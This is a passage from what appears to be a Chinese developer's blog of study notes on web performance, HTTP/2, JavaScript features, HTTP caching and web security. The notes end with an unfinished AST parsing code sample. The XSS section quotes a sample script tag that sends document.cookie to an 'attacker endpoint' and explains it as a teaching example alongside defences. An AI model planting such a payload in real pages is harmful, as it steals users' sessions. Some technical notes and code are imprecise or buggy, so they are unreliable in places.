<li>回源率: 没命中缓存，即从服务器拿数据</li>
</ul>
</li>
</ol>
<h3 id="减少请求次数"><a href="#减少请求次数" class="headerlink" title="减少请求次数"></a>减少请求次数</h3><h4 id="资源合并"><a href="#资源合并" class="headerlink" title="资源合并"></a>资源合并</h4><p>http 请求是需要建立连接的，这个过程是需要时间的，当多个资源有多个请求时，明显的很耗费时间<br>解决方案：</p>
<ol>
<li>雪碧图</li>
</ol>
<h4 id="域名分片"><a href="#域名分片" class="headerlink" title="域名分片"></a>域名分片</h4><p>同个域名浏览器可以有 6-8 个网络连接（tcp 连接），<strong>以 <code>Chrome</code> 为例，限制一个域名同时并发 6 个连接</strong><br>解决方案：</p>
<ol>
<li>多域名</li>
</ol>
<h4 id="HTTP-缓存"><a href="#HTTP-缓存" class="headerlink" title="HTTP 缓存"></a>HTTP 缓存</h4><p><a href="../http/readme.md#%E7%BC%93%E5%AD%98">HTTP 缓存</a></p>
<h3 id="压缩资源"><a href="#压缩资源" class="headerlink" title="压缩资源"></a>压缩资源</h3><h4 id="数据压缩"><a href="#数据压缩" class="headerlink" title="数据压缩"></a>数据压缩</h4><ol>
<li>gzip 与新的 br</li>
</ol>
<p>gzip: 运用广泛<br>br: 由 <code>Chrome</code> 开发的新的压缩算法，性能比 <code>gzip</code> 高由于浏览器兼容问题，运用不广</p>
<h4 id="代码文件压缩"><a href="#代码文件压缩" class="headerlink" title="代码文件压缩"></a>代码文件压缩</h4><ol>
<li>HTML&#x2F;CSS&#x2F;JS 中的注释、空格、长变量名等</li>
</ol>
<h4 id="静态资源"><a href="#静态资源" class="headerlink" title="静态资源"></a>静态资源</h4><ol>
<li>字体图标，去除元数据（图片中的作者，时间，大小等信息），缩小尺寸及分辨率，使用 <code>jpg</code> 或者 <code>webp</code> 格式</li>
</ol>
<h4 id="头与报文"><a href="#头与报文" class="headerlink" title="头与报文"></a>头与报文</h4><ol>
<li><code>http1.1</code> 中减少不必要的头</li>
<li>减少 <code>cookie</code> 数据量</li>
</ol>
<h3 id="HTTP2-协议"><a href="#HTTP2-协议" class="headerlink" title="HTTP2 协议"></a>HTTP2 协议</h3><p><code>HTTP2 协议</code>本身就比 <code>HTTP1.1</code> 快上很多!</p>
<p>那么快在哪？</p>
<h4 id="头部压缩"><a href="#头部压缩" class="headerlink" title="头部压缩"></a>头部压缩</h4><p><strong>臃肿的请求</strong>头（平均测试为 <code>460</code> 字节）是使之变慢的重要原因之一，HTTP2 为此的解决方案：</p>
<ol>
<li>专门的 HPACK 压缩算法<ul>
<li>索引表</li>
<li>霍夫曼编码</li>
</ul>
</li>
</ol>
<p><strong>索引表：</strong></p>
<p>需要<code>客户端</code>和<code>服务端</code>共同维护，分为一个静态表 <code>Static Table</code>（<strong>静态表存放几乎所有常用的头信息键值对</strong>），一个动态表 <code>Dynamic Table</code>。</p>
<ul>
<li>当客户端请求的时候只需要发送表<code>Static Table</code>中的索引值比如: <code>:method=GET</code> 用 2 表示等，并且值会通过<strong>霍夫曼编码</strong>进行压缩字符</li>
<li>当发送了一个在<code>Static Table</code>中的 <code>User-Agent</code>，索引为 <code>58，但是他的值不在``Static Table</code>中，请求的时候用 <code>58</code>，表示 <code>User-Agent</code>，服务器接收后会将 <code>User-Agent</code> 添加到<code>Dynamic Table</code>，缓存起来</li>
</ul>
<h4 id="二进制帧"><a href="#二进制帧" class="headerlink" title="二进制帧"></a>二进制帧</h4><p>在 HTTP1.1 文本字符分割的数据流，导致解析慢且容易出错，解决方案：<br><strong>二进制帧：</strong></p>
<ol>
<li>帧长度</li>
<li>帧类型</li>
<li>帧标识</li>
</ol>
<h4 id="链路复用-多路复用"><a href="#链路复用-多路复用" class="headerlink" title="链路复用(多路复用)"></a>链路复用(多路复用)</h4><p><img src="/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-12-31%20010537.png" alt="屏幕截图 2021-12-31 010537"></p>
<blockquote>
<p>简单来说： <strong>一个域名只维护一个 TCP，一个 TCP 可以并发多个 HTTP 请求</strong></p>
</blockquote>
<p>那么多路复用有什么优点以及怎么在现实体现它的快速呢：<br>假设，有服务端的最大并发 <code>TCP</code> 量为 <code>600，那么在</code> <code>HTTP1.1</code> 下，一个客户端最大的 <code>TCP</code> 并发为 <code>6</code> 个，那么在最大的并发量下，可接纳最多的用户为<code> 600 / 6 = 100</code> 个，那如果第 <code>101</code> 一个发起请求，那么还要等那 <code>100</code> 用户其中之一的 <code>TCP</code> 完成之后才开始<code>（队头阻塞</code>）。那么在 <code>HTTP2</code> 的多路复用下：<br><strong>一个域名共用一个 TCP，意味着可达到的并发用户量为 600 &#x2F; 1 &#x3D; 600 个！与服务端并发量达到一致。并且一个 TCP 可并发多个 HTTP 请求</strong>，再利用上述所说二进制分层实现并行请求，任何时候都可以发送请求给服务器解决对队头阻塞问题</p>
<h2 id="如何让数据处理更高效"><a href="#如何让数据处理更高效" class="headerlink" title="如何让数据处理更高效"></a>如何让数据处理更高效</h2><ol>
<li>HTML 语义标签加强 DOM 解析</li>
<li>多使用为元素，减少 JS 多 DOM 的查找遍历</li>
<li>能用 HTML&#x2F;CSS 实现的效率就不用用 JS</li>
<li>逻辑与展示解耦，避免不必要的 JS 引擎启动（HTML 出现 js 代码）</li>
<li>减少作用域查找和闭包，避免&#x3D;&#x3D;</li>
<li>SSR 服务端渲染（next.js，nuxt.js）</li>
</ol>
<h3 id="SSR-服务端渲染"><a href="#SSR-服务端渲染" class="headerlink" title="SSR 服务端渲染"></a>SSR 服务端渲染</h3><p>在客户端请求服务器的时候，服务器到数据库种获取数据，并且在服务器种将 vue 等组件，数据等转化为 HTML，服务器再将 HTML 返回给客户端。<strong>这个在服务器将组件数据等转为 HTML 的过程就叫服务端渲染</strong><br>要了解 SSR，首先要了解同构的概念。</p>
<h4 id="同构"><a href="#同构" class="headerlink" title="同构"></a>同构</h4><p>在服务端渲染中，有两种页面渲染方式，</p>
<ol>
<li>前端服务器通过请求服务器获取数据并组装 HTML 返回给浏览器，浏览器直接解析 HTM 给页面</li>
<li>浏览器在交互过程中，请求新的数据并动态更新渲染页面</li>
</ol>
<p>这两种有一点不同点，也就是第一种是在服务器将 HTML 返回给客户端，而第二种是在客户端组成 HTML，运行环境不一样那么同构要做的事就是用一套代码兼容这两种情况</p>
<h4 id="同构的条件"><a href="#同构的条件" class="headerlink" title="同构的条件"></a>同构的条件</h4><p>对于同构的应用来说，必须实现客户端和服务端的路由、模型组件、模型数据的共享。</p>
<p>SSR 图解：<br><img src="/images/786a415a-5fee-11e6-9c11-45a2cfdf085c.png" alt="SSR图解"></p>
<h1 id="解释性语言和编译性语言"><a href="#解释性语言和编译性语言" class="headerlink" title="解释性语言和编译性语言"></a>解释性语言和编译性语言</h1><p><code>编译性语言（C/GO...）</code>,在程序运行之前要经过编译器编译，编译后机器保留机器能读懂的二进制文件，当程序运行的时候直接运行二进制，不需重新编译<br><code>解释性语言（JS/Python..）</code>,在每次运行时都要经过解释器动态解释和运行</p>
<p>编译器和解释器原理：<br><img src="/images/e10bcb4c5b2d5fc20787089de0e10a5.png" alt="编译器和解释器"></p>
<h2 id="如何执行-JS"><a href="#如何执行-JS" class="headerlink" title="如何执行 JS"></a>如何执行 JS</h2><p>JIT(即时编译 just in time)技术：<br>热点代码会执行编译。<br><img src="/images/bde7952e95c68bba437997ddc92d89f.png" alt="js执行过程"></p>
<ol>
<li>逐行解逐行执行</li>
<li>热点区一次性编译（JIT）<br>字节码需要解释器转换成机器码才能执行</li>
</ol>
<blockquote>
<p>ps: 机器码所需内存比字节码大，但是执行速度快,</p>
</blockquote>
<h1 id="ES7"><a href="#ES7" class="headerlink" title="ES7"></a>ES7</h1><ul>
<li>Array.prototype.includes()</li>
<li>Math.pow()</li>
</ul>
<h1 id="ES8"><a href="#ES8" class="headerlink" title="ES8"></a>ES8</h1><ul>
<li>async&#x2F;await</li>
<li>Object.values()</li>
<li>Object.entries()</li>
</ul>
<h1 id="ES9"><a href="#ES9" class="headerlink" title="ES9"></a>ES9</h1><ul>
<li>异步迭代</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i <span class="keyword">of</span> array) &#123;</span><br><span class="line">  <span class="keyword">await</span> <span class="title function_">doSomething</span>(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>Promise.finally()</li>
<li>Rest&#x2F;Spread 属性</li>
</ul>
<h1 id="ES10"><a href="#ES10" class="headerlink" title="ES10"></a>ES10</h1><ul>
<li>flat()</li>
<li>flatMap()</li>
<li>Object.fromEntries()</li>
<li>BigInt</li>
</ul>
<h1 id="ES11"><a href="#ES11" class="headerlink" title="ES11"></a>ES11</h1><ul>
<li>空值处理 ??</li>
<li>可选链 ?</li>
<li>Promise.allSettled</li>
<li>Dynamic import</li>
</ul>
<h1 id="隐式转换"><a href="#隐式转换" class="headerlink" title="隐式转换"></a>隐式转换</h1><p>js 的隐式转换会发生在运算过程，比如<code>+ - * / == &lt; &gt;</code>;<br>简单类型：<br>一般的情况会将两侧转换会数字再进行运算：<br>比如：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> + <span class="literal">false</span>; <span class="comment">// 1</span></span><br><span class="line"><span class="number">1</span> + <span class="title class_">Number</span>(<span class="literal">false</span>); <span class="comment">// 1 + 0</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span> == <span class="literal">false</span>;</span><br><span class="line"><span class="number">1</span> == <span class="title class_">Number</span>(<span class="literal">false</span>); <span class="comment">// 1 == 0</span></span><br></pre></td></tr></table></figure>

<p>特殊情况：<br>当 <code>+</code> 号 两个存在字符串，两边会直接当作字符串运算</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> + <span class="string">&quot;1&quot;</span>; <span class="comment">// 11</span></span><br></pre></td></tr></table></figure>

<p>引用类型：<br>会执行<code>ToPrimitive</code>运算，默认执行 <code>valueOf -&gt; toString</code> 转换基本类型运算</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = &#123;&#125;;</span><br><span class="line">a &gt; <span class="literal">false</span>; <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line">a.<span class="title function_">valueOf</span>(); <span class="comment">// &#123;&#125;</span></span><br><span class="line">a.<span class="title function_">toString</span>(); <span class="comment">// [object Object]</span></span><br><span class="line"><span class="title class_">Number</span>(<span class="string">&quot;[obejct Object]&quot;</span>) &gt; <span class="literal">false</span>; <span class="comment">// NaN &gt; false</span></span><br></pre></td></tr></table></figure>

<h1 id="浏览器窗口通讯"><a href="#浏览器窗口通讯" class="headerlink" title="浏览器窗口通讯"></a>浏览器窗口通讯</h1>
      
    </div>
    <footer class="article-footer">
      <a data-url="https://wxyhahaha.github.io/2022/07/01/js/readme/" data-id="cl51viy5f00051svz84qa9ueb" data-title="js" class="article-share-link">Teilen</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-http/readme" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/07/01/http/readme/" class="article-date">
  <time class="dt-published" datetime="2022-07-01T03:06:14.772Z" itemprop="datePublished">2022-07-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/07/01/http/readme/">http</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h1><h2 id="OSI-7-层参考模型"><a href="#OSI-7-层参考模型" class="headerlink" title="OSI 7 层参考模型"></a>OSI 7 层参考模型</h2><h2 id="TCP-x2F-IP-协议"><a href="#TCP-x2F-IP-协议" class="headerlink" title="TCP&#x2F;IP 协议"></a>TCP&#x2F;IP 协议</h2><ol>
<li>应用层(<code>HTTP</code>&#x2F;<code>HTTPS</code>&#x2F;<code>DNS</code>)</li>
<li>传输层(<code>TCP</code>&#x2F;<code>UDP</code>)</li>
<li>internet 层(<code>IP</code>)</li>
<li>网络接口层(<code>物理接口</code>)</li>
</ol>
<h3 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h3><p><strong>Transmisson Control Prorocol</strong></p>
<ol>
<li>连接建立</li>
<li>可靠性传输<br>特点： 三次握手四次挥手</li>
</ol>
<h3 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h3><p><strong>User DataGram Protocol</strong></p>
<ol>
<li>非连接，不可靠传输方式</li>
<li>效率高，速度快，适合音频和视频</li>
</ol>
<h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><p><strong>Domain Name System</strong><br>域名解析系统<br>怎么查找域名：<br>DNS 域名解析采用的是递归查询的方式，过程，DNS 缓存&gt;根域名服务器&gt;根域名下一级</p>
<h2 id="HTTP-协议"><a href="#HTTP-协议" class="headerlink" title="HTTP 协议"></a>HTTP 协议</h2><p>Hypertext Transfer Protocol<br>超文本传输协议</p>
<h2 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h2><p>数据库缓存、服务器端缓存（<code>nginx</code>、<code>CDN 缓存</code>）、浏览器缓存<br>浏览器缓存由包含很多内容：<code>HTTP 缓存</code>、<code>indexDB</code>、<code>cookie</code>、<code>localstorage </code>等等</p>
<h3 id="HTTP-缓存"><a href="#HTTP-缓存" class="headerlink" title="HTTP 缓存"></a>HTTP 缓存</h3><p>强缓存和协商缓存的区别就是，强缓存是不需要发请求到服务器的，而协商缓存是需要浏览器发送请求到服务器判断本地的缓存是否失效，若不失效则不请求服务器，反之请求服务器获取最新资源</p>
<h3 id="强缓存"><a href="#强缓存" class="headerlink" title="强缓存"></a>强缓存</h3><p>命中强缓存时，状态码为 200（Size 列标识为 from cache）的响应请求，利用 <code>Expire</code>s 和<code> Cache-Control</code> 控制强缓存。</p>
<ol>
<li>Expires<br>该值是响应头的字段，指定缓存到期的时间， <code>Expires=时间</code>，该时间为绝对时间，<code>Last-Modify</code> 结合使用</li>
<li>Cache-Control<br>该值是响应头的字段，指定缓存到期的时间，<code>Cache-Control=max-age+时间</code>，该事件为相对时间</li>
</ol>
<p><code>Cache-Control</code> 优先级比 <code>Expires</code> 高<br>优点：<br>服务器配置有限，降低服务器压力，1 台服务器能做到 10 台服务器的能力</p>
<blockquote>
<p>&lt;- Expires: xxxx<br>&lt;- Cache-Control:max-age&#x3D;600</p>
</blockquote>
<h3 id="协商缓存"><a href="#协商缓存" class="headerlink" title="协商缓存"></a>协商缓存</h3><p>命中协商缓存时，状态码为 304，利用 <code>Last-Modify/If-Modify-Since</code></p>
<ol>
<li>Last-Modify&#x2F;If-Modify-Since<br>第一次请求服务器，返回时会带上 <code>Last-Modify</code> 的响应头，标识着该资源最后修改时间，第二次请求时会带上 <code>If-Modify-since</code> 请求头，值为第一次响应的 <code>Last-Modify</code> 值，服务器会根据 <code>If-Modify-since</code> 判断是否命中缓存，<strong>如果命中则不请求服务器，返回 304</strong>，不返回 <code>Last-Modify</code><br>第一次响应： <code>Last-Modify</code><br>第二次请求： <code>If-Modify-since</code></li>
<li>Etag&#x2F;If-None-Match<br><code>Etag/If-None-Match</code> <code>返回的是一个校验码，Etag</code> 保证每个资源时唯一的，资源的变化都为导致 Etag 改变，服务器根据浏览器发送的 <code>If-None-Match</code> 判断是否命中缓存<br>两者会优先验证 <code>Etag</code>,两种区别：</li>
</ol>
<ul>
<li>精度问题，第一种的精度时精确到秒，当资源的改变在秒级的时候，不太准确。所以由了 <code>Etag</code></li>
<li>文件定期生成，当内容一样时，无法使用 <code>Last-Modify</code> 这一套</li>
<li>有可能存在服务器没有准确获取文件修改时间等，<code>Last-Modify</code> 也不能使用</li>
</ul>
<blockquote>
<p>&lt;- last-modifed: xxx<br>-&gt; if-modified-since: xxx<br>&lt;- etag: bbb<br>-&gt; if-noe-match: bbb</p>
</blockquote>
<h1 id="web-安全"><a href="#web-安全" class="headerlink" title="web 安全"></a>web 安全</h1><h2 id="浏览器如何获取到-Cookie"><a href="#浏览器如何获取到-Cookie" class="headerlink" title="浏览器如何获取到 Cookie"></a>浏览器如何获取到 Cookie</h2><ul>
<li>利用接口响应的 Set-Cookie 字段<br>有哪些属性</li>
</ul>
<ol>
<li>domain</li>
<li>max-age、Express</li>
<li>httponly</li>
<li>name&#x3D;value</li>
</ol>
<h2 id="XSS-Cross-Site-Script-跨站脚本攻击"><a href="#XSS-Cross-Site-Script-跨站脚本攻击" class="headerlink" title="XSS (Cross-Site-Script) 跨站脚本攻击"></a>XSS (Cross-Site-Script) 跨站脚本攻击</h2><p>恶意攻击者，将一些恶意代码插入到网页，当用户访问的时候自动执行这段代码，从而达到攻击者目的</p>
<ol>
<li>反射型<br>特点： 一次性<br>用户点开带有恶意的 url（含有 script），浏览器将此段发送给服务端，服务端返回客户端，此时浏览器识别到可执行代码将其执行</li>
<li>存储型<br>特点：恶意代码存储到服务器<br>攻击者提交含有 script 标签的恶意代码表单到服务器，服务端将其保存，展示给其他用户时执行恶意代码</li>
</ol>
<h3 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h3><ol>
<li>将 <code>&lt;script scr=&quot;https://攻击者接口?cookie=document.cookie&quot;&gt; &lt;/script&gt;</code>， 注册成用户名， 提交给服务端，服务端保存</li>
<li>用户登录，如果查看到这个攻击者的账号信息相关，那么会执行恶意代码，将 cookie 拿到，发送到攻击者接口</li>
<li>攻击者事先会收集各种接口，找到相关可以获取到用户的接口</li>
<li>通过 cookie 获取到用户信息（手机号等）等</li>
</ol>
<h3 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h3><ol>
<li>冒充身份</li>
<li>刷点击（注入文章地址）</li>
<li>弹广告（注入一段创建弹窗的代码）</li>
<li>蠕虫病毒（冒充身份去发送邮件，联系人点开又会冒充去发送邮件….）</li>
</ol>
<h3 id="怎么防御"><a href="#怎么防御" class="headerlink" title="怎么防御"></a>怎么防御</h3><ol>
<li>输入过滤，对于特殊符号等不允许提交</li>
<li>httponly</li>
<li>转义 HTML 比如： <code>&lt; =&gt; &amp;lt</code> 、 <code>&gt; =&gt; &amp;gt</code></li>
</ol>
<h2 id="CSRF-Cross-Site-Request-Forgery-跨站点请求伪造"><a href="#CSRF-Cross-Site-Request-Forgery-跨站点请求伪造" class="headerlink" title="CSRF (Cross-Site-Request-Forgery) 跨站点请求伪造"></a>CSRF (Cross-Site-Request-Forgery) 跨站点请求伪造</h2><p>诱导受害者去到攻击者的网站，攻击者网站发起了相关请求，并且带上了受害者 cookie，从而可以做一些恶意的操作</p>
<p>前提： 浏览器没有严格执行同源政策，请求所在网站必须和请求的接口同源，就有可能发生 CSRF</p>
<h3 id="实现过程-1"><a href="#实现过程-1" class="headerlink" title="实现过程"></a>实现过程</h3><ol>
<li>受害者登录信任网站</li>
<li>未关闭含有 cookie 的信任网站</li>
<li>诱导受害者去攻击者网站（如果配合 XSS 此时可能会直接跳转，或者弹窗诱导到攻击者网站）</li>
<li>在攻击者网站（用隐藏表单自动发送请求，img&#x2F;src 自动 get 请求等骚操作…）发起信任网站相关接口，此时会携带用户的 cookie，冒充用户</li>
</ol>
<h3 id="用途-1"><a href="#用途-1" class="headerlink" title="用途"></a>用途</h3><ol>
<li>冒充身份</li>
<li>蠕虫病毒（冒充身份去发送邮件，联系人点开又会冒充去发送邮件….）</li>
</ol>
<h3 id="怎么防御-1"><a href="#怎么防御-1" class="headerlink" title="怎么防御"></a>怎么防御</h3><ol>
<li>用验证码，信任网站开启验证码，而攻击者网站没办法获取正确验证码</li>
<li>Referer ，表明请求的站点地址，但是有可能存在伪造 <code>Referer</code> 头</li>
<li>token，客户端接收服务端的 token，保存在隐藏区域（本地存储，隐藏的 html 元素，代码内存等），请求带上 token</li>
<li>使用带有同源政策的浏览器，升级到默认开启严格模式版本</li>
</ol>
<h2 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h2><p>是在数据传输时发生的攻击手段。截取 http 在传输时数据包，获取用户信息，篡改信息，篡改密钥</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://wxyhahaha.github.io/2022/07/01/http/readme/" data-id="cl51vix6i00041svzazfn5v7o" data-title="http" class="article-share-link">Teilen</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-ast/readme" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/07/01/ast/readme/" class="article-date">
  <time class="dt-published" datetime="2022-07-01T03:06:14.760Z" itemprop="datePublished">2022-07-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/07/01/ast/readme/">ast</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="ast"><a href="#ast" class="headerlink" title="ast"></a>ast</h1><p>abstract syntax tree, 抽象语法树</p>
<h1 id="常见结构"><a href="#常见结构" class="headerlink" title="常见结构"></a>常见结构</h1><ul>
<li>FunctionDeclaration 函数<ul>
<li>id{}</li>
<li>body{}[]</li>
</ul>
</li>
<li>ClassDeclaration 类<ul>
<li>id{}</li>
<li>body{}[]<ul>
<li>ClassProperty<ul>
<li>key{}</li>
<li>value</li>
</ul>
</li>
<li>ClassMethod<ul>
<li>key</li>
<li>body{}</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>VariableDeclaration 变量声明<ul>
<li>declarations{}[]</li>
<li>kind</li>
</ul>
</li>
<li>VariableDeclarator 变量说明符<ul>
<li>id{}</li>
<li>init{}</li>
</ul>
</li>
<li>returnStatement<ul>
<li>argument{}</li>
</ul>
</li>
<li>ExpressionStatement 表达式<ul>
<li>expression{}</li>
</ul>
</li>
<li>CallExpression 调用表达式<ul>
<li>callee{}</li>
<li>arguments[]</li>
</ul>
</li>
<li>MemberExpression 成员调用表达式<ul>
<li>object{}</li>
<li>property{}</li>
</ul>
</li>
<li>BinaryExpression 运算符表达式<ul>
<li>left</li>
<li>operator</li>
<li>right</li>
</ul>
</li>
<li>ConditionalExpression 条件运算符表达式<ul>
<li>test{}</li>
<li>consequent{}</li>
<li>alternate{}</li>
</ul>
</li>
<li>ObjectExpression 对象表达式</li>
<li>ArrayExpression 数组表达式<ul>
<li>elements[]</li>
</ul>
</li>
<li>UnaryExpression 元表达式<ul>
<li>operator</li>
<li>argument</li>
</ul>
</li>
<li>Identifier<ul>
<li>name</li>
</ul>
</li>
<li>Literal<ul>
<li>value</li>
</ul>
</li>
</ul>
<h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><p>尝试解析一个 json</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; <span class="title class_">Parser</span> &#125; = <span class="built_in">require</span>(<span class="string">&quot;acorn&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="comment">/**store*/</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Base</span> &#123;</span><br><span class="line">  shopOptions = [];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Handle</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">base</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">base</span> = base;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">async</span> <span class="title function_">getShopOptions</span>(<span class="params">platform, shopId</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">getSkuWeight</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Compile</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">handle</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">handle</span> = handle;</span><br><span class="line">  &#125;</span><br><span class="line">  config = &#123;</span><br><span class="line">    <span class="attr">events</span>: &#123;</span><br><span class="line">      <span class="string">&quot;base.shopOptions&quot;</span>: <span class="string">&quot;a.f.sd&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">async</span> <span class="title function_">execute</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> events = <span class="variable language_">this</span>.<span class="property">config</span>.<span class="property">events</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> [key, value] <span class="keyword">of</span> <span class="title class_">Object</span>.<span class="title function_">entries</span>(events)) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">genFile</span>(key, key);</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">genFile</span>(key+<span class="string">&#x27;2&#x27;</span>, value);</span><br><span class="line">      <span class="keyword">const</span> [context, expression] = value.<span class="title function_">includes</span>(<span class="string">&quot;.&quot;</span>)</span><br><span class="line">        ? expression.<span class="title function_">split</span>(<span class="string">&quot;.&quot;</span>)</span><br><span class="line">        : [<span class="variable language_">this</span>.<span class="property">handle</span>, value];</span><br><span class="line">      <span class="keyword">const</span> res = <span class="variable language_">this</span>.<span class="title function_">parse</span>(<span class="variable language_">this</span>.<span class="property">handle</span>, value);</span><br><span class="line">      <span class="keyword">if</span> (key.<span class="title function_">indexOf</span>(<span class="string">&quot;.&quot;</span>) &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> [_context, option] = key.<span class="title function_">split</span>(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="variable language_">this</span>.<span 